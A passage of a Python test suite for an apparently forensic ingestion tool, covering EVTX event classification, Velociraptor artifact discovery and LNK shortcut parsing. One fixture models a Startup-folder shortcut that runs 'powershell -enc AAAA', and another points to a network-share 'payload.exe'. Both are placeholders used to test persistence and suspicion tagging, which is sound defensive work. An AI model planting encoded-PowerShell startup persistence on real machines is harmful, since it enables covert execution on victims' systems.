    docs = normalize_file("case-1", "ev-1", "art-1", fixture, {"artifact_type": "evtx", "name": fixture.name, "source_path": str(fixture), "parser": "zimmerman"})
    assert any(doc["windows"]["event_id"] == 4624 for doc in docs)
    assert any(doc["event"]["type"] == "logon_success" for doc in docs)
    mismatch_4625 = next(doc for doc in docs if doc["windows"]["event_id"] == 4625 and doc["windows"]["channel"] == "Application")
    assert mismatch_4625["event"]["type"] == "event_id_4625"
    assert "source_mismatch" in mismatch_4625["tags"]
    assert any(doc["windows"]["payload"].get("Payload") for doc in docs)


def test_semi_auto_rdp_includes_logon_type_10(monkeypatch) -> None:
    event = {
        "id": "doc-1",
        "event_id": "evt-1",
        "case_id": "case-1",
        "evidence_id": "ev-1",
        "artifact_id": "art-1",
        "@timestamp": "2026-03-28T11:00:00+00:00",
        "source_file": "EvtxECmd_Output.csv",
        "host": {"name": "movistar-pc"},
        "user": {"name": "alex"},
        "source": {"ip": "192.168.1.50"},
        "event": {"type": "logon_success", "severity": "info", "message": "Successful logon"},
        "windows": {
            "logon_type": "10",
            "event_id": 4624,
            "record_number": "1",
            "channel": "Security",
            "provider": "Microsoft-Windows-Security-Auditing",
            "event_data": {},
        },
        "tags": ["authentication", "logon", "rdp"],
        "suspicious_reasons": [],
    }
    monkeypatch.setattr("app.analysis.semi_auto.iter_case_events", lambda case_id, query=None: iter([event]))
    analysis = build_case_semi_auto_analysis("case-1")
    assert analysis["sections"]["rdp"]
    assert analysis["sections"]["rdp"][0]["activity_type"] == "rdp_logon"


def test_host_detection_collection_name(tmp_path: Path) -> None:
    root = tmp_path / "Collection-movistar-pc-2026-05-03T11_30_24Z"
    root.mkdir()
    assert detect_host_from_velociraptor_collection(root / "results") == "movistar-pc"
    assert not is_probable_hostname("Collection-movistar-pc-2026-05-03T11_30_24Z.zip")
    assert not is_probable_hostname("/tmp/file.csv")
    assert normalize_hostname("MOVISTAR-PC") == "movistar-pc"


def test_host_detection_rejects_filename_contamination_candidates() -> None:
    assert normalize_hostname("scheduled_task_regression.xml") is None
    assert normalize_hostname("NTUSER.DAT") is None
    assert normalize_hostname("SRUDB.dat") is None
    assert detect_host_from_artifacts(
        [
            {"name": "scheduled_task_regression.xml", "source_path": "scheduled_task_regression.xml"},
            {"name": "NTUSER.DAT", "source_path": "C:\\Windows\\System32\\config\\NTUSER.DAT"},
            {"name": "SRUDB.dat", "source_path": "C:\\Windows\\System32\\sru\\SRUDB.dat"},
        ]
    ) is None


def test_noise_reduction_report_counts_adjusted_and_downgraded_items() -> None:
    report = _build_noise_reduction_report(
        [
            {
                "id": "evt-1",
                "event": {
                    "type": "autorun",
                    "message": "Autorun observed",
                    "risk_adjustment": {
                        "base_score": 70,
                        "final_score": 20,
                        "negative_reasons": ["Microsoft signed and verified in known-good Windows path"],
                        "suppressed": False,
                        "suppression_reason": None,
                    },
                },
                "tags": ["benign_microsoft_signed", "known_good_windows_path"],
                "risk_score": 20,
            }
        ],
        [{"id": "finding-1", "data_quality": ["filename_only_match"]}],
    )
    assert report["events_adjusted"] == 1
    assert report["findings_downgraded"] == 1
    assert report["known_good_counts"]["benign_microsoft_signed"] == 1
    assert report["by_reason"]["Microsoft signed and verified in known-good Windows path"] == 1


def test_velociraptor_uploads_detected_not_parsed(tmp_path: Path) -> None:
    uploads = tmp_path / "uploads" / "auto" / "C%3A"
    (uploads / "Windows/System32/winevt/Logs").mkdir(parents=True)
    (uploads / "Windows/Prefetch").mkdir(parents=True)
    (uploads / "Users/alex").mkdir(parents=True)
    (uploads / "Windows/System32/config").mkdir(parents=True)
    (uploads / "Windows/System32/winevt/Logs/Security.evtx").write_text("", encoding="utf-8")
    (uploads / "Windows/Prefetch/CMD.EXE-12345678.pf").write_text("", encoding="utf-8")
    (uploads / "Windows/System32/config/NTUSER.DAT").write_text("", encoding="utf-8")
    (uploads / "Users/alex/History").write_text("", encoding="utf-8")
    artifacts = list_velociraptor_upload_artifacts(tmp_path)
    types = {artifact["artifact_type"] for artifact in artifacts}
    assert {"evtx_raw", "prefetch_raw", "registry_hive_raw", "browser_history_raw"}.issubset(types)
    assert all(artifact["status"] == "detected_not_parsed" for artifact in artifacts)


def test_raw_parser_router_describes_native_evtx_and_lnk() -> None:
    evtx = describe_raw_candidate("C:/Windows/System32/winevt/Logs/Security.evtx", "evtx_raw")
    lnk = describe_raw_candidate("C:/Users/alex/AppData/Roaming/Microsoft/Windows/Recent/report.lnk", "lnk_raw")
    service = describe_raw_candidate("C:/Windows/System32/config/SYSTEM", "service")
    assert evtx and evtx["parser"] == "evtx_raw"
    assert lnk and lnk["parser"] == "lnk_raw" and lnk["parser_status"] == "parsed_native"
    assert service and service["parser"] == "windows_service_registry"
    assert route_raw_parser(Path("Security.evtx")).parser_name == "evtx_raw"
    assert route_raw_parser(Path("report.lnk")).parser_name == "lnk_raw"


def test_velociraptor_uploads_native_raw_candidates_supported(monkeypatch, tmp_path: Path) -> None:
    monkeypatch.setattr("app.ingest.raw_parsers.router.evtx_native_available", lambda: True)
    uploads = tmp_path / "uploads" / "auto" / "C%3A"
    (uploads / "Windows/System32/winevt/Logs").mkdir(parents=True)
    (uploads / "Users/alex/AppData/Roaming/Microsoft/Windows/Recent").mkdir(parents=True)
    (uploads / "Windows/System32/winevt/Logs/Security.evtx").write_text("", encoding="utf-8")
    (uploads / "Users/alex/AppData/Roaming/Microsoft/Windows/Recent/report.lnk").write_bytes(_build_minimal_shell_link_bytes(local_path="C:\\Users\\alex\\Documents\\report.docx"))
    discovery = discover_velociraptor_evidences(tmp_path)
    candidates = {candidate.artifact_type: candidate for candidate in discovery.candidates if candidate.artifact_type in {"evtx_raw", "lnk_raw"}}
    assert candidates["evtx_raw"].supported is True
    assert candidates["evtx_raw"].parser_status == "parsed_native"
    assert "parsed natively" in str(candidates["evtx_raw"].reason).lower()
    assert candidates["lnk_raw"].supported is True
    assert candidates["lnk_raw"].parser_status == "parsed_native"


def test_velociraptor_evtx_raw_candidate_reports_disabled_parser(monkeypatch, tmp_path: Path) -> None:
    monkeypatch.setattr("app.ingest.raw_parsers.router.evtx_native_available", lambda: False)
    uploads = tmp_path / "uploads" / "auto" / "C%3A"
    (uploads / "Windows/System32/winevt/Logs").mkdir(parents=True)
    (uploads / "Windows/System32/winevt/Logs/Security.evtx").write_text("", encoding="utf-8")
    discovery = discover_velociraptor_evidences(tmp_path)
    candidate = next(item for item in discovery.candidates if item.artifact_type == "evtx_raw")
    assert candidate.supported is False
    assert candidate.parser_status == "detected_not_implemented"
    assert "native evtx parsing is not enabled" in str(candidate.reason).lower()


def test_velociraptor_discovery_detects_multiple_evtx(monkeypatch, tmp_path: Path) -> None:
    monkeypatch.setattr("app.ingest.raw_parsers.router.evtx_native_available", lambda: True)
    uploads = tmp_path / "uploads" / "auto" / "C%3A" / "Windows" / "System32" / "winevt" / "Logs"
    uploads.mkdir(parents=True)
    for name in ["Security.evtx", "System.evtx", "Application.evtx"]:
        (uploads / name).write_text("", encoding="utf-8")
    discovery = discover_velociraptor_evidences(tmp_path)
    evtx_candidates = [item for item in discovery.candidates if item.artifact_type == "evtx_raw"]
    assert len(evtx_candidates) == 3
    assert all(item.supported is True for item in evtx_candidates)


def test_parse_evtx_xml_record_extracts_controlled_fields() -> None:
    xml_text = """
    <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
      <System>
        <Provider Name="Microsoft-Windows-Security-Auditing" />
        <EventID>4625</EventID>
        <Channel>Application</Channel>
        <Computer>dfir-pc</Computer>
        <EventRecordID>55</EventRecordID>
        <Level>0</Level>
        <Task>12544</Task>
        <Opcode>0</Opcode>
        <Keywords>0x8020000000000000</Keywords>
        <TimeCreated SystemTime="2026-05-12T12:00:00.0000000Z" />
        <Execution ProcessID="1234" ThreadID="5678" />
        <Security UserID="S-1-5-18" />
      </System>
      <EventData>
        <Data Name="TargetUserName">alex</Data>
        <Data Name="IpAddress">10.0.0.5</Data>
      </EventData>
    </Event>
    """
    row = parse_evtx_xml_record(xml_text)
    assert row["EventID"] == "4625"
    assert row["Channel"] == "Application"
    assert row["Provider"] == "Microsoft-Windows-Security-Auditing"
    assert row["RecordID"] == "55"
    assert row["Payload"] == {"TargetUserName": "alex", "IpAddress": "10.0.0.5"}
    assert "TargetUserName=alex" in str(row["EventDataSummary"])


def test_native_evtx_parser_normalizes_and_keeps_4625_non_security_safe(monkeypatch, tmp_path: Path) -> None:
    xml_text = """
    <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
      <System>
        <Provider Name="Microsoft-Windows-Security-Auditing" />
        <EventID>4625</EventID>
        <Channel>Application</Channel>
        <Computer>dfir-pc</Computer>
        <EventRecordID>77</EventRecordID>
        <TimeCreated SystemTime="2026-05-12T12:00:00.0000000Z" />
      </System>
      <EventData>
        <Data Name="TargetUserName">alex</Data>
      </EventData>
    </Event>
    """
    monkeypatch.setattr("app.ingest.raw_parsers.evtx_parser.iter_evtx_xml_record_results", lambda path: iter([(1, xml_text, None)]))
    parser = EvtxRawParser()
    artifact = tmp_path / "Security.evtx"
    artifact.write_text("placeholder", encoding="utf-8")
    result = parser.parse(artifact, case_id="case-1", evidence_id="ev-1", artifact_id="art-1", artifact_meta={"name": artifact.name, "source_path": "C:/Windows/System32/winevt/Logs/Security.evtx"})
    assert result.parser_status == "parsed_native"
    assert len(result.events) == 1
    event = result.events[0]
    assert event["artifact"]["type"] == "windows_event"
    assert event["artifact"]["parser"] == "evtx_raw"
    assert event["windows"]["record_id"] == "77"
    assert event["windows"]["event_data_summary"]
    assert event["event"]["type"] != "logon_failed"
    assert event["event"]["category"] == "windows_event"
    assert event["event"]["action"] == "windows_event_observed"


def test_native_evtx_parser_skips_broken_records(monkeypatch, tmp_path: Path) -> None:
    xml_text = """
    <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
      <System>
        <Provider Name="Microsoft-Windows-WLAN-AutoConfig" />
        <EventID>8001</EventID>
        <Channel>Microsoft-Windows-WLAN-AutoConfig/Operational</Channel>
        <Computer>dfir-pc</Computer>
        <EventRecordID>88</EventRecordID>
        <TimeCreated SystemTime="2026-05-12T12:00:00.0000000Z" />
      </System>
      <EventData>
        <Data Name="SSID">LabWifi</Data>
      </EventData>
    </Event>
    """
    monkeypatch.setattr(
        "app.ingest.raw_parsers.evtx_parser.iter_evtx_xml_record_results",
        lambda path: iter([(1, None, Exception(136)), (2, xml_text, None)]),
    )
    parser = EvtxRawParser()
    artifact = tmp_path / "Wlan.evtx"
    artifact.write_text("placeholder", encoding="utf-8")
    result = parser.parse(artifact, case_id="case-1", evidence_id="ev-1", artifact_id="art-1", artifact_meta={"name": artifact.name, "source_path": "C:/Windows/System32/winevt/Logs/Wlan.evtx"})
    assert result.parser_status == "parsed_native"
    assert result.records_read == 2
    assert len(result.events) == 1
    assert any("record 1: 136" in error for error in result.errors)


def test_evtx_security_4624_classifies_as_logon_success() -> None:
    row = {
        "EventID": "4624",
        "Channel": "Security",
        "Provider": "Microsoft-Windows-Security-Auditing",
        "TargetUserName": "alex",
        "LogonType": "2",
        "IpAddress": "10.0.0.5",
    }
    document = normalize_row("case-1", "ev-1", "art-1", row, {"name": "Security.evtx", "artifact_type": "windows_event", "parser": "evtx_raw", "source_tool": "native_evtx", "source_format": "evtx"})
    assert document["event"]["type"] == "logon_success"


def test_evtx_appx_event_400_does_not_classify_as_powershell() -> None:
    row = {
        "EventID": "400",
        "Channel": "Microsoft-Windows-AppXDeploymentServer/Operational",
        "Provider": "Microsoft-Windows-AppXDeployment-Server",
        "EventDataSummary": "Package deployment started",
        "RawXml": "<Event><System><EventID>400</EventID></System></Event>",
    }
    document = normalize_row("case-1", "ev-1", "art-1", row, {"name": "AppX.evtx", "artifact_type": "windows_event", "parser": "evtx_raw", "source_tool": "native_evtx", "source_format": "evtx"})
    assert document["event"]["category"] == "windows_event"
    assert document["event"]["type"] == "event_id_400"
    assert document["event"]["action"] == "windows_event_observed"
    assert "PowerShell" not in str(document["event"]["message"])
    assert document["raw_summary"].startswith("Provider=Microsoft-Windows-AppXDeployment-Server")
    assert "<Event><System>" not in document["raw_summary"]
    assert "<Event><System>" not in document["search_text"]


def test_evtx_staterepository_event_400_does_not_classify_as_powershell() -> None:
    row = {
        "EventID": "400",
        "Channel": "Microsoft-Windows-StateRepository/Operational",
        "Provider": "Microsoft-Windows-StateRepository",
    }
    document = normalize_row("case-1", "ev-1", "art-1", row, {"name": "StateRepository.evtx", "artifact_type": "windows_event", "parser": "evtx_raw"})
    assert document["event"]["type"] == "event_id_400"
    assert document["event"]["category"] == "windows_event"
    assert "powershell" not in " ".join(document["tags"]).lower()


def test_evtx_powershell_400_only_when_real_powershell_source() -> None:
    row = {
        "EventID": "400",
        "Channel": "Windows PowerShell",
        "Provider": "PowerShell",
    }
    document = normalize_row("case-1", "ev-1", "art-1", row, {"name": "PowerShell.evtx", "artifact_type": "windows_event", "parser": "evtx_raw"})
    assert document["event"]["type"] == "powershell_engine_lifecycle"


def test_evtx_wmi_5858_requires_wmi_source() -> None:
    good_row = {
        "EventID": "5858",
        "Channel": "Microsoft-Windows-WMI-Activity/Operational",
        "Provider": "Microsoft-Windows-WMI-Activity",
        "Operation": "ExecQuery",
    }
    bad_row = {
        "EventID": "5858",
        "Channel": "Application",
        "Provider": "Contoso-App",
    }
    good_document = normalize_row("case-1", "ev-1", "art-1", good_row, {"name": "WMI.evtx", "artifact_type": "windows_event", "parser": "evtx_raw"})
    bad_document = normalize_row("case-1", "ev-1", "art-1", bad_row, {"name": "Other.evtx", "artifact_type": "windows_event", "parser": "evtx_raw"})
    assert good_document["event"]["type"] == "wmi_query"
    assert bad_document["event"]["category"] == "windows_event"
    assert bad_document["event"]["type"] == "event_id_5858"


def test_evtx_bits_requires_bits_source() -> None:
    good_row = {
        "EventID": "60",
        "Channel": "Microsoft-Windows-Bits-Client/Operational",
        "Provider": "Microsoft-Windows-Bits-Client",
    }
    bad_row = {
        "EventID": "60",
        "Channel": "Application",
        "Provider": "Contoso-App",
    }
    good_document = normalize_row("case-1", "ev-1", "art-1", good_row, {"name": "BITS.evtx", "artifact_type": "windows_event", "parser": "evtx_raw"})
    bad_document = normalize_row("case-1", "ev-1", "art-1", bad_row, {"name": "Other.evtx", "artifact_type": "windows_event", "parser": "evtx_raw"})
    assert good_document["event"]["type"] == "bits_job_error"
    assert bad_document["event"]["type"] == "event_id_60"


def test_normalize_lnk_raw_marks_execution_and_startup_suspicion() -> None:
    row = {
        "SourceFile": "C:\\Users\\alex\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Updater.lnk",
        "TargetPath": "C:\\Users\\alex\\AppData\\Roaming\\updater.exe",
        "Arguments": "powershell -enc AAAA",
        "WorkingDirectory": "C:\\Users\\alex\\AppData\\Roaming",
        "TargetAccessed": "2026-05-12T12:00:00+00:00",
        "SourceModified": "2026-05-12T12:10:00+00:00",
    }
    document = normalize_row("case-1", "ev-1", "art-1", row, {"name": "Updater.lnk", "artifact_type": "lnk", "parser": "lnk_raw", "source_tool": "native_lnk", "source_format": "lnk"})
    assert document["event"]["type"] == "startup_lnk"
    assert document["event"]["category"] == "persistence"
    assert document["artifact"]["parser"] == "lnk_raw"
    assert "startup_folder" in document["tags"]
    assert "suspicious_arguments" in document["tags"]
    assert "execution_candidate" in document["tags"]
    assert document["persistence"]["mechanism"] == "startup_folder_lnk"
    assert document["lnk"]["source_modified"] == "2026-05-12T12:10:00+00:00"
    assert document["event_id"]


def test_normalize_lnk_raw_marks_unc_network_path() -> None:
    row = {
        "SourceFile": "C:\\Users\\alex\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\share.lnk",
        "TargetPath": "\\\\server\\share\\payload.exe",
        "NetworkPath": "\\\\server\\share\\payload.exe",
        "TargetAccessed": "2026-05-12T12:00:00+00:00",
    }
    document = normalize_row("case-1", "ev-1", "art-1", row, {"name": "share.lnk", "artifact_type": "lnk", "parser": "lnk_raw"})
    assert document["event"]["type"] == "network_path_opened"
    assert "network_path" in document["tags"]


def test_normalize_lnk_raw_marks_cloud_and_partial_targets() -> None:
    cloud_row = {
        "SourceFile": "C:\\Users\\alex\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\cloud.lnk",
        "TargetPath": "C:\\Users\\alex\\OneDrive\\Documents\\secret.xlsx",
        "TargetAccessed": "2026-05-12T12:00:00+00:00",
    }
    cloud_document = normalize_row("case-1", "ev-1", "art-1", cloud_row, {"name": "cloud.lnk", "artifact_type": "lnk", "parser": "lnk_raw", "source_tool": "native_lnk", "source_format": "lnk"})
    assert "cloud_path" in cloud_document["tags"]
    assert cloud_document["cloud"]["provider"] == "onedrive"

    partial_row = {
        "SourceFile": "C:\\Users\\alex\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\desktop.lnk",
        "TargetIDAbsolutePath": "Desktop\\",
        "SourceModified": "2026-05-12T12:10:00+00:00",
    }
    partial_document = normalize_row("case-1", "ev-1", "art-1", partial_row, {"name": "desktop.lnk", "artifact_type": "lnk", "parser": "lnk_raw", "source_tool": "native_lnk", "source_format": "lnk"})
    assert "partial_lnk_target" in (partial_document.get("data_quality") or [])
    assert partial_document["lnk"]["is_partial_target"] is True
    assert partial_document["timestamp_precision"] == "lnk_source_modified"


def test_native_lnk_parser_extracts_local_path_arguments_and_timestamps(tmp_path: Path) -> None:
    lnk_path = tmp_path / "report.lnk"
    lnk_path.write_bytes(
        _build_minimal_shell_link_bytes(
            local_path="C:\\Users\\alex\\Documents\\report.docx",
            working_directory="C:\\Users\\alex\\Documents",
            arguments="/preview",
            description="Report shortcut",
            accessed_at=datetime(2026, 5, 12, 12, 0, tzinfo=UTC),
            modified_at=datetime(2026, 5, 12, 11, 55, tzinfo=UTC),
            created_at=datetime(2026, 5, 12, 11, 50, tzinfo=UTC),
            drive_type=2,
            volume_serial=0xABCD1234,
        )
    )
    result = LnkRawParser().parse(
        lnk_path,
        case_id="case-1",
        evidence_id="ev-1",
        artifact_id="art-1",
        artifact_meta={
            "source_path": "C:\\Users\\alex\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\report.lnk",
            "artifact_type": "lnk",
            "parser": "lnk_raw",
            "source_tool": "native_lnk",
            "source_format": "lnk",
            "mtime": "2026-05-12T12:05:00+00:00",
        },
    )
    assert result.parser_status == "parsed_native"
    assert result.events
    event = result.events[0]
    assert event["file"]["path"] == "C:\\Users\\alex\\Documents\\report.docx"
    assert event["lnk"]["arguments"] == "/preview"
    assert event["lnk"]["working_directory"] == "C:\\Users\\alex\\Documents"
    assert event["lnk"]["drive_type"] == "removable"
    assert event["lnk"]["drive_serial_number"] == "ABCD1234"
    assert event["timestamp_precision"] == "lnk_target_accessed"
    assert event["user"]["name"] == "alex"
    assert event["lnk"]["source_file"] == "C:\\Users\\alex\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\report.lnk"
    assert event["artifact"]["source_path"] == "C:\\Users\\alex\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\report.lnk"
    assert event["file"]["source_path"] == "C:\\Users\\alex\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\report.lnk"
    assert event["ingest"]["processed_at"]
    assert event["event"]["message"].startswith("LNK indicates recent access/reference:")


def test_native_lnk_parser_start_menu_shortcut_resolves_executable_target(tmp_path: Path) -> None:
    lnk_path = tmp_path / "Google Chrome.lnk"
    lnk_path.write_bytes(
        _build_minimal_shell_link_bytes(
            local_path="C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
            working_directory="C:\\Program Files\\Google\\Chrome\\Application",
            description="Google Chrome",
            modified_at=datetime(2026, 5, 12, 11, 55, tzinfo=UTC),
        )
    )
    result = LnkRawParser().parse(
        lnk_path,
        case_id="case-1",
        evidence_id="ev-1",
        artifact_id="art-1",
        artifact_meta={
            "source_path": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Google Chrome.lnk",
            "artifact_type": "lnk",
            "parser": "lnk_raw",
            "source_tool": "native_lnk",
            "source_format": "lnk",
            "mtime": "2026-05-12T12:05:00+00:00",
        },
    )
    event = result.events[0]
    assert event["lnk"]["effective_path"] == "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
    assert event["event"]["type"] == "shortcut_to_executable"
    assert event["file"]["extension"] == ".exe"
    assert event["event"]["message"].startswith("Start Menu shortcut to executable:")


def test_native_lnk_parser_unresolved_target_emits_warnings_and_no_parser_time_timestamp(tmp_path: Path) -> None:
    lnk_path = tmp_path / "File Explorer.lnk"
    lnk_path.write_bytes(_build_minimal_shell_link_bytes())
    result = LnkRawParser().parse(
        lnk_path,
        case_id="case-1",
        evidence_id="ev-1",
        artifact_id="art-1",
        artifact_meta={
            "source_path": "C%3A/Users/dfir/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/User Pinned/TaskBar/File Explorer.lnk",
            "artifact_type": "lnk",
            "parser": "lnk_raw",
            "source_tool": "native_lnk",
            "source_format": "lnk",
            "mtime": "2026-05-12T12:05:00+00:00",
        },
    )
    event = result.events[0]
    assert event["user"]["name"] == "dfir"
    assert event["lnk"]["source_file"] == "C:\\Users\\dfir\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\File Explorer.lnk"
    assert event["artifact"]["source_path"] == event["lnk"]["source_file"]
    assert event["file"]["source_path"] == event["lnk"]["source_file"]
    assert event["lnk"]["effective_path"] is None
    assert event["lnk"]["parse_warnings"]
    assert "no_resolved_target_path" in event["lnk"]["parse_warnings"]
    assert "linkinfo_absent" in event["lnk"]["parse_warnings"]
    assert "target_id_list_present_unresolved" not in event["lnk"]["parse_warnings"]
    assert event["timestamp_precision"] == "source_file_mtime_low_confidence"
    assert "low_confidence_timestamp" in event["data_quality"]
    assert event["@timestamp"] == "2026-05-12T12:05:00+00:00"
    assert event["ingest"]["processed_at"] != event["@timestamp"]
    assert "suspicious" not in set(event["tags"])
    assert event["event"]["type"] == "shortcut_observed"
    assert event["event"]["message"].startswith("LNK shortcut observed:")
    assert event["host"]["name"] is None
    assert event["host"]["hostname"] is None
    assert "missing_host" in event["data_quality"]


def test_normalize_lnk_row_without_reliable_timestamp_excludes_timeline() -> None:
    row = {
        "SourceFile": "C:\\Users\\dfir\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\desktop.lnk",
        "ParseWarnings": "no_resolved_target_path",
    }
    document = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        row,
        {
            "name": "desktop.lnk",
            "artifact_type": "lnk",
            "parser": "lnk_raw",
            "source_tool": "native_lnk",
            "source_format": "lnk",
            "parser_processed_at": "2026-05-13T10:00:00+00:00",
        },
    )
    assert document["@timestamp"] is None
    assert document["event"]["timeline_include"] is False
    assert document["timestamp_precision"] == "unknown"
    assert "missing_timestamp" in document["data_quality"]
    assert document["ingest"]["processed_at"] == "2026-05-13T10:00:00+00:00"


def test_start_menu_lnk_uses_shortcut_wording_and_not_recent_access() -> None:
    row = {
        "SourceFile": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Wireshark.lnk",
        "LocalPath": "C:\\Program Files\\Wireshark\\Wireshark.exe",
        "WorkingDirectory": "C:\\Program Files\\Wireshark",
        "TargetModified": "2026-05-12T09:00:00+00:00",
    }
    document = normalize_row("case-1", "ev-1", "art-1", row, {"name": "Wireshark.lnk", "artifact_type": "lnk", "parser": "lnk_raw", "source_tool": "native_lnk", "source_format": "lnk"})
    assert document["lnk"]["effective_path"] == "C:\\Program Files\\Wireshark\\Wireshark.exe"
    assert document["event"]["type"] == "shortcut_to_executable"
    assert document["file"]["extension"] == ".exe"
    assert document["event"]["message"].startswith("Start Menu shortcut to executable:")
    assert "recent access/reference" not in document["event"]["message"]


def test_start_menu_lnk_uses_icon_location_low_confidence_fallback() -> None:
    row = {
        "SourceFile": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Google Chrome.lnk",
        "IconLocation": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe,0",
        "HasLinkInfo": True,
        "HasPropertyStoreDataBlock": True,
    }
    document = normalize_row("case-1", "ev-1", "art-1", row, {"name": "Google Chrome.lnk", "artifact_type": "lnk", "parser": "lnk_raw", "source_tool": "native_lnk", "source_format": "lnk"})
    assert document["lnk"]["effective_path"] == "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
    assert document["lnk"]["effective_path_source"] == "icon_location_low_confidence"
    assert "effective_path_from_icon_location" in (document.get("data_quality") or [])
    assert document["event"]["type"] == "shortcut_to_executable"
    assert "recent access/reference" not in document["event"]["message"]


def test_recent_lnk_to_archive_in_downloads_is_not_suspicious() -> None:
    row = {
        "SourceFile": "C:\\Users\\dfir\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\pal.lnk",
        "TargetPath": "C:\\Users\\dfir\\Downloads\\pal.zip",
        "TargetAccessed": "2026-05-12T09:00:00+00:00",
    }
    document = normalize_row("case-1", "ev-1", "art-1", row, {"name": "pal.lnk", "artifact_type": "lnk", "parser": "lnk_raw", "source_tool": "native_lnk", "source_format": "lnk"})
    assert "user_writable_path" in document["tags"]
    assert "archive_file" in document["tags"]
    assert "suspicious_path" not in document["tags"]
    assert not document["suspicious_reasons"]
    assert int(document.get("risk_score") or 0) <= 10


def test_recent_lnk_to_executable_in_downloads_can_be_suspicious() -> None:
    row = {
        "SourceFile": "C:\\Users\\dfir\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\tool.lnk",
        "TargetPath": "C:\\Users\\dfir\\Downloads\\tool.exe",
        "TargetAccessed": "2026-05-12T09:00:00+00:00",
    }
    document = normalize_row("case-1", "ev-1", "art-1", row, {"name": "tool.lnk", "artifact_type": "lnk", "parser": "lnk_raw", "source_tool": "native_lnk", "source_format": "lnk"})
    assert "user_writable_path" in document["tags"]
    assert "suspicious_path" in document["tags"]
    assert "execution_candidate" in document["tags"]
    assert document["suspicious_reasons"]


def test_native_lnk_referencing_amcache_output_stays_lnk_recent() -> None:
    row = {
        "SourceFile": "C:\\Users\\dfir\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AmcacheParser_DriveBinaries.csv.lnk",
        "TargetPath": "C:\\Users\\dfir\\Desktop\\AmcacheParser_DriveBinaries.csv",
        "TargetAccessed": "2026-05-12T09:00:00+00:00",
    }
    document = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        row,
        {"name": "LNK raw - AmcacheParser_DriveBinaries.csv.lnk", "artifact_type": "lnk", "parser": "lnk_raw", "source_tool": "native_lnk", "source_format": "lnk"},
    )
    assert document["artifact"]["type"] == "lnk"
    assert document["artifact"]["parser"] == "lnk_raw"
    assert document["event"]["type"] == "file_opened"
    assert document["event"]["category"] == "file_access"
    assert document["event"]["type"] != "amcache_program_observed"
    assert "references_amcache_output" in document["tags"]


def test_native_lnk_office_recent_referencing_amcache_output_stays_lnk() -> None:
    row = {
        "SourceFile": "C:\\Users\\dfir\\AppData\\Roaming\\Microsoft\\Office\\Recent\\AmcacheParser_DriveBinaries.csv.LNK",
        "TargetPath": "C:\\Users\\dfir\\Desktop\\AmcacheParser_DriveBinaries.csv",
        "TargetAccessed": "2026-05-12T09:00:00+00:00",
    }
    document = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        row,
        {"name": "LNK raw - AmcacheParser_DriveBinaries.csv.LNK", "artifact_type": "lnk", "parser": "lnk_raw", "source_tool": "native_lnk", "source_format": "lnk"},
    )
    assert document["artifact"]["type"] == "lnk"
    assert document["event"]["type"] == "file_opened"
    assert document["event"]["type"] != "amcache_program_observed"


def test_lnk_host_is_not_inferred_from_filename() -> None:
    row = {
        "SourceFile": "C:\\Users\\dfir\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\test.lnk",
        "TargetPath": "C:\\Temp\\report.docx",
        "TargetAccessed": "2026-05-12T09:00:00+00:00",
        "Hostname": "iecompatdata.xml",
    }
    document = normalize_row("case-1", "ev-1", "art-1", row, {"name": "test.lnk", "artifact_type": "lnk", "parser": "lnk_raw", "source_tool": "native_lnk", "source_format": "lnk"})
    assert document["host"]["name"] is None
    assert document["host"]["hostname"] is None
    assert "missing_host" in document["data_quality"]


def test_velociraptor_lnk_discovery_classifies_locations_and_summary(tmp_path: Path) -> None:
    uploads = tmp_path / "uploads" / "auto" / "C%3A"
    recent = uploads / "Users/alex/AppData/Roaming/Microsoft/Windows/Recent/report.lnk"
    office = uploads / "Users/alex/AppData/Roaming/Microsoft/Office/Recent/sheet.lnk"
    startup = uploads / "Users/alex/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/run.lnk"
    for path in (recent, office, startup):
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(_build_minimal_shell_link_bytes(local_path="C:\\Users\\alex\\Documents\\report.docx"))
    discovery = discover_velociraptor_evidences(tmp_path)
    lnk_candidates = [candidate for candidate in discovery.candidates if candidate.artifact_type == "lnk_raw"]
    locations = {candidate.original_path: candidate.lnk_location for candidate in lnk_candidates}
    assert locations[recent.relative_to(tmp_path).as_posix()] == "recent"
    assert locations[office.relative_to(tmp_path).as_posix()] == "office_recent"
    assert locations[startup.relative_to(tmp_path).as_posix()] == "startup"
    assert discovery.summary["lnk_candidates_total"] >= 3
    assert discovery.summary["lnk_recent_candidates"] >= 1
    assert discovery.summary["lnk_office_recent_candidates"] >= 1
    assert discovery.summary["lnk_startup_candidates"] >= 1


def test_generate_debug_pack_includes_native_lnk_sample_and_parse_report(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    case = Case(id="case-1", name="Debug Case")
    evidence = Evidence(
        id="evidence-1",
        case_id="case-1",
        original_filename="sample.zip",
        stored_path=str(tmp_path / "sample.zip"),
        evidence_type=EvidenceType.parsed_folder,
        sha256="00",
